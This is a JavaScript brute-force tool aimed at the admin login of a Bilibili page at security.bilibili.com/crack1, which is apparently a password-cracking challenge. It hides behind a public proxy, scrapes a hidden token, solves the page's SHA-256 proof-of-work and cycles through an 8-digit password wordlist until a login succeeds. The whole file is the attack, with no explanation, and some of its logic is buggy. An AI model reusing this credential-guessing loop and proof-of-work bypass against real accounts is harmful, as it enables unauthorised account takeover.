const fs = require('fs');

// use password subset
let passwordFile = fs.readFileSync('./top19576-only-8-digits.txt', 'utf8');

const axios = require('axios')
const cheerio = require('cheerio');

const HttpsProxyAgent = require('https-proxy-agent');

axios.defaults.withCredentials = true

// support retry

const axiosDefaultConfig = {
    // baseURL: 'https://www.youtube.com',
    proxy: false,
    //https://www.kuaidaili.com/free/
    httpsAgent: new HttpsProxyAgent('http://207.236.12.190:80')
};

const retryWrapper = (axios, options) => {
    const max_time = options.retry_time;
    const retry_status_code = options.retry_status_code;
    let counter = 0;
    axios.interceptors.response.use(null, (error) => {
        /** @type {import("axios").AxiosRequestConfig} */
        const config = error.config
        // you could defined status you want to retry, such as 503
        // if (counter < max_time && error.response.status === retry_status_code) {
        if (counter < max_time) {
            console.log(`[${error.response.status}]:retry.... ${counter + 1}`)
            counter++
            return new Promise((resolve) => {
                resolve(axios(config))
            })
        }
        return Promise.reject(error)
    })
}

retryWrapper(axios, {retry_time: 5})

// https://stackoverflow.com/a/70138040
// set cookie

const {CookieJar} = require('tough-cookie');
const {wrapper} = require('axios-cookiejar-support');

const jar = new CookieJar();
const client = wrapper(axios.create({jar, axiosDefaultConfig}));

const url = 'https://security.bilibili.com/crack1/index'

let username = "admin"
let password = "bilibili" // baseline

function sleep(ms) {
    return new Promise(resolve => {
        setTimeout(resolve, ms)
    })
}

function crack() {
    client.get(url)
        .then(async res => {
            // console.log(res.data)
            //<input class="form-input" name="random" id="random" type="hidden" value="35053c06-22e1-4260-bf41-6f1dfa7b0a4c">

            // mock visit index page
            const doc = cheerio.load(res.data);
            let randomValue = doc("#random").val();
            console.log("randomValue: " + randomValue)

            // for loop password line by line and try to log in
            for (const line of passwordFile.split(/\r?\n/)) {
                console.log("Now password is: " + line)
                mining(username, password, randomValue)
                await sleep(500)
            }
        })
}

function SHA256(s) {
    const chrsz = 8
    const hexcase = 0

    function safe_add(x, y) {
        const lsw = (x & 0xFFFF) + (y & 0xFFFF)
        const msw = (x >> 16) + (y >> 16) + (lsw >> 16)
        return (msw << 16) | (lsw & 0xFFFF)
    }

    function S(X, n) {
        return (X >>> n) | (X << (32 - n))
    }

    function R(X, n) {
        return (X >>> n)
    }

    function Ch(x, y, z) {
        return ((x & y) ^ ((~x) & z))
    }

    function Maj(x, y, z) {
        return ((x & y) ^ (x & z) ^ (y & z))
    }

    function Sigma0256(x) {
        return (S(x, 2) ^ S(x, 13) ^ S(x, 22))
    }

    function Sigma1256(x) {
        return (S(x, 6) ^ S(x, 11) ^ S(x, 25))
    }

    function Gamma0256(x) {
        return (S(x, 7) ^ S(x, 18) ^ R(x, 3))
    }

    function Gamma1256(x) {
        return (S(x, 17) ^ S(x, 19) ^ R(x, 10))
    }

    function core_sha256(m, l) {
        const K = [0x428A2F98, 0x71374491, 0xB5C0FBCF, 0xE9B5DBA5, 0x3956C25B, 0x59F111F1, 0x923F82A4, 0xAB1C5ED5, 0xD807AA98, 0x12835B01, 0x243185BE, 0x550C7DC3, 0x72BE5D74, 0x80DEB1FE, 0x9BDC06A7, 0xC19BF174, 0xE49B69C1, 0xEFBE4786, 0xFC19DC6, 0x240CA1CC, 0x2DE92C6F, 0x4A7484AA, 0x5CB0A9DC, 0x76F988DA, 0x983E5152, 0xA831C66D, 0xB00327C8, 0xBF597FC7, 0xC6E00BF3, 0xD5A79147, 0x6CA6351, 0x14292967, 0x27B70A85, 0x2E1B2138, 0x4D2C6DFC, 0x53380D13, 0x650A7354, 0x766A0ABB, 0x81C2C92E, 0x92722C85, 0xA2BFE8A1, 0xA81A664B, 0xC24B8B70, 0xC76C51A3, 0xD192E819, 0xD6990624, 0xF40E3585, 0x106AA070, 0x19A4C116, 0x1E376C08, 0x2748774C, 0x34B0BCB5, 0x391C0CB3, 0x4ED8AA4A, 0x5B9CCA4F, 0x682E6FF3, 0x748F82EE, 0x78A5636F, 0x84C87814, 0x8CC70208, 0x90BEFFFA, 0xA4506CEB, 0xBEF9A3F7, 0xC67178F2]
        const HASH = [0x6A09E667, 0xBB67AE85, 0x3C6EF372, 0xA54FF53A, 0x510E527F, 0x9B05688C, 0x1F83D9AB, 0x5BE0CD19]
        const W = new Array(64)
        let a, b, c, d, e, f, g, h, i, j
        let T1, T2
        m[l >> 5] |= 0x80 << (24 - l % 32)
        m[((l + 64 >> 9) << 4) + 15] = l
        for (i = 0; i < m.length; i += 16) {
            a = HASH[0]
            b = HASH[1]
            c = HASH[2]
            d = HASH[3]
            e = HASH[4]
            f = HASH[5]
            g = HASH[6]
            h = HASH[7]
            for (j = 0; j < 64; j++) {
                if (j < 16) {
                    W[j] = m[j + i]
                } else {
                    W[j] = safe_add(safe_add(safe_add(Gamma1256(W[j - 2]), W[j - 7]), Gamma0256(W[j - 15])), W[j - 16])
                }
                T1 = safe_add(safe_add(safe_add(safe_add(h, Sigma1256(e)), Ch(e, f, g)), K[j]), W[j])
                T2 = safe_add(Sigma0256(a), Maj(a, b, c))
                h = g
                g = f
                f = e
                e = safe_add(d, T1)
                d = c
                c = b
                b = a
                a = safe_add(T1, T2)
            }
            HASH[0] = safe_add(a, HASH[0])
            HASH[1] = safe_add(b, HASH[1])
            HASH[2] = safe_add(c, HASH[2])
            HASH[3] = safe_add(d, HASH[3])
            HASH[4] = safe_add(e, HASH[4])
            HASH[5] = safe_add(f, HASH[5])
            HASH[6] = safe_add(g, HASH[6])
            HASH[7] = safe_add(h, HASH[7])
        }
        return HASH
    }

    function str2binb(str) {
        const bin = []
        const mask = (1 << chrsz) - 1
        for (let i = 0; i < str.length * chrsz; i += chrsz) {
            bin[i >> 5] |= (str.charCodeAt(i / chrsz) & mask) << (24 - i % 32)
        }
        return bin
    }

    function Utf8Encode(string) {
        string = string.replace(/\r\n/g, '\n')
        let utfText = ''
        for (let n = 0; n < string.length; n++) {
            const c = string.charCodeAt(n)
            if (c < 128) {
                utfText += String.fromCharCode(c)
            } else if ((c > 127) && (c < 2048)) {
                utfText += String.fromCharCode((c >> 6) | 192)
                utfText += String.fromCharCode((c & 63) | 128)
            } else {
                utfText += String.fromCharCode((c >> 12) | 224)
                utfText += String.fromCharCode(((c >> 6) & 63) | 128)
                utfText += String.fromCharCode((c & 63) | 128)
            }
        }
        return utfText
    }

    function binb2hex(binarray) {
        const hex_tab = hexcase ? '0123456789ABCDEF' : '0123456789abcdef'
        let str = ''
        for (let i = 0; i < binarray.length * 4; i++) {
            str += hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8 + 4)) & 0xF) +
                hex_tab.charAt((binarray[i >> 2] >> ((3 - i % 4) * 8)) & 0xF)
        }
        return str
    }

    s = Utf8Encode(s)
    return binb2hex(core_sha256(str2binb(s), s.length * chrsz))
}

async function mining(username, password, random) {
    let nonce = 9; //当前难度
    // let nonce = parseInt(Math.random()*100 + 9);
    console.log('nonce: ' + nonce);
    let currentIndex = 0; //末尾计数器
    for (let i = currentIndex; i < Math.pow(2, 255); i++) {
        // console.log("try..." + i)
        let mystr = username + password + random + i.toString();
        var s256 = SHA256(mystr);
        var s256hex = parseInt(s256, 16)
        if (s256hex < Math.pow(2, (256 - nonce))) {
            console.log("success!");
            console.log("mystr:" + mystr);
            console.log("s256: " + s256);
            console.log("s256hex: " + s256hex);

            // console.log("username: " + username)
            // console.log("password: " + password)
            // console.log("nonce: " + nonce);
            // console.log("random: " + random)
            // console.log("proof: " + i)

            let proof = i.toString();

            try {
                let result = await login(username, password, nonce, random, proof);
                console.log('result: ' + result)
            } catch (e) {
                console.log("login error: " + e)
            }
            break;
        }
    }
}

async function login(username, password, nonce, random, proof) {
    loginUrl = "https://security.bilibili.com/crack1/login"
    data = {
        'username': username,
        'password': password,
        'nonce': nonce,
        'random': random,
        'proof': proof,
    }
    let getFlag = false;
    config = {
        headers: {
            //
        }
    }
    await client.post(loginUrl, data, config).then(r => {
        console.log(username, password, nonce, random, proof)
        // console.log(r.data['msg'])
        if (r.data && r.data['msg'].includes("you don\'t proof your work")) {
            console.log("Trying...... password is: " + password + "=========FAILED: " + r.data['msg'])
            getFlag = false;
        } else {
            console.log("Trying...... password is: " + password + "=========SUCCESS")
            getFlag = true;
            console.log('success resp: ' + JSON.stringify(r.data))
        }
    }).catch(reason => {
        console.log(`catch error with ${password} need retry + ${reason.toString()}`)
        // 如果当前密码因为其他原因失败，保存记录，以后重试。
        fs.appendFileSync('password-need-retry.txt', `${password}\r\n`, 'utf8')
        getFlag = false;
    })

    return getFlag

}

// crack();

function intruder() {
    client.get(url)
        .then(async res => {
            // console.log(res.data)
            //<input class="form-input" name="random" id="random" type="hidden" value="35053c06-22e1-4260-bf41-6f1dfa7b0a4c">

            // mock visit index page
            const doc = cheerio.load(res.data);
            let randomValue = doc("#random").val();
            console.log("randomValue: " + randomValue)

            // for loop password line by line and try to log in
            for (const line of passwordFile.split(/\r?\n/)) {
                password = line.trim()
                let nonce = 9;

                let res = await login(username, password, nonce, randomValue, 34 + "");
                if (res) {
                    break
                }

                await sleep(500)
            }
        })
}

intruder()

